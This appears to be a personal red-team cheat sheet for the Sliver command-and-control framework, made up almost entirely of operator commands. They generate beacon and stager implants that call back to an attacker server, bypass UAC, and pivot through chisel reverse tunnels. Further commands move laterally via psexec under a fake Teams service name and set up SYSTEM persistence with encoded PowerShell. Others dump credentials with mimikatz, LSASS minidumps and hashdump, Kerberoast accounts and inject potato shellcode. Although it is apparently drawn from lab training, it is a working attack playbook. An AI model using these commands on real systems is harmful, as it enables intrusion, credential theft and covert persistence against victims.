# Sliver c2

### Initial Setup

```shell
# Start the server
./sliver-server_linux 

# Create operator
new-operator -n moghees -l server_ip

# Enable multiplayer mode
multiplayer

# Connect using client
./sliver-client_linux import filename
./sliver-client_linux 
```

### Useful Extensions installation

```shell
armory install seatbelt sa-whoami sharp-hound-4 sa-adcs-enum sa-netstat sa-netshares sa-sc-enum c2tc-domaininfo certify delegationbof c2tc-kerberoast
```

### Implants

- Implants are an essential part of the operation of a command and control server. 
- Implants can operate in beacon and session modes.
- Beacons are slow and sessions are interactive but less secure.

> OPSEC: ~/.sliver/config/http-c2.json

```shell
# Generate beacon implant HTTP
generate beacon --http 127.0.0.1 -N name --os windows
# Start a listener
http --lport 80

# Generate beacon implant Named Pipe (like bind shell)
pivots named-pipe --bind randompipe
generate --named-pipe 127.0.0.1/pipe/randompipe -N name
```

- Stagers:

```shell
# Create a profile for stager
profiles new --http server_ip:80 --format shellcode stager_name

# Create stage listener
stage-listener --url tcp://server_ip:4443 --profile stager_name

# Start HTTP listener
http -L server_ip -l 80

# Generate payload
generate stager --lhost server_ip --lport 4443 --format csharp --save staged.txt
```

- Usage

```shell
# List beacons
beacons

# List sessions
sessions

# Start session from beacon
interactive

# Use beacon or session
use beacon_id
```

### UAC Bypass

> Try `getsystem` command in session implant

```shell
# https://github.com/icyguider/UAC-BOF-Bonanza
cp -rp ~/tools/UACBypasses/SspiUacBypass /home/moghees/.sliver-client/extensions/
cd /home/moghees/.sliver-client/extensions/SspiUacBypass/; make

extensions load /home/moghees/.sliver-client/extensions/SspiUacBypass
SspiUacBypass payload.exe
```

### Pivoting and Tunneling

```shell
# Remote port forward (remote port to local port 2222)
rportfwd add --bind 2222 -r 10.10.144.231:22

# Setting up chisel for pivoting
sudo apt install mingw-w64
git clone https://github.com/MrAle98/chisel

cd chisel/
mkdir ~/.sliver-client/extensions/chisel
cp extension.json ~/.sliver-client/extensions/chisel
make windowsdll_64
make windowsdll_32
cp chisel.x64.dll ~/.sliver-client/extensions/chisel/
cp chisel.x86.dll ~/.sliver-client/extensions/chisel/

# Start server on our machine
sudo sh -c 'sed -i s/socks4/socks5/g /etc/proxychains.conf && sed -i s/9050/1080/g /etc/proxychains.conf'
chisel server --reverse -p 1337 -v --socks5

# Running chisel
chisel client our_machine_ip:1337 R:socks
```

```shell
pivots tcp --bind compromised_host_ip
generate --format service -i compromised_host_ip:port -N name
# Run pivot
psexec --custom-exe psexec-pivot.exe --service-name Teams --service-description MicrosoftTeaams target_host
```

### Useful commands

```shell
# Run as another user
runas -u redpuppet -P "RedPuppet123" -p c:\\programdata\\puppet\\puppet-update.exe
make-token -u svc_sql -d child.htb.local -p jkhnrjk123!
```

```shell
# Execute command
execute command
execute powershell 'schtasks /create /sc minute /mo 1 /tn SecurityUpdater /tr "powershell.exe -enc base64" /ru SYSTEM'

# Run a .net assembly (spawns child process)
execute-assembly Seatbelt.exe -group=system
execute-assembly /home/moghees/SharpView.exe "get-netuser -PreauthNotRequired" -t 240 -i -E -M

# Load a local binary
sideload /home/mimikatz.exe "token::elevate privilege::debug sekurlsa::logonpasswords exit"

# Execute shellcode using Donut
git clone https://github.com/TheWover/donut
cd donut/
make -f Makefile
./donut -i GodPotato-NET4.exe -a 2 -b 2 -p '-cmd c:\temp\http-beacon.exe' -o godpotato.bin
execute-assembly /home/moghees/Rubeus.exe createnetonly /program:C:\\windows\\system32\\notepad.exe
execute-shellcode -p rubeus_created_process_id /home/moghees/godpotato.bin

# Run a powershell script
sharpsh -t 300 -- -c invoke-privesccheck -u c:\\temp\\PrivescCheck.ps1
sharpsh -i -s -t 300 -- -u c:\\temp\\CVE-2021-34527.ps1 -e -c <base64>
sharpsh -- '-u http://10.10.14.62:8081/PowerView.ps1 -e -c Z2V0LW5ldHVzZXIgfCBzZWxlY3QgIHNhbWFjY291bnRuYW1lLGRlc2NyaXB0aW9u'
```

```shell
# Run sharphound
sharp-hound-4 -s -t 300 -- -c all,gpolocalgroup

# Priv esc bofs
seatbelt -- -group=system
sharpup -- audit

# Credential dumping
hashdump
procdump --pid 660 --save /tmp/lsass.dmp # pypykatz lsa minidump /tmp/lsass.dmp

# Persistence : https://academy.hackthebox.com/app/module/241/section/2670
# PPL Bypass: https://academy.hackthebox.com/app/module/241/section/2683

# Kerberoasting
delegationbof 6 domain
c2tc-kerberoast roast user
```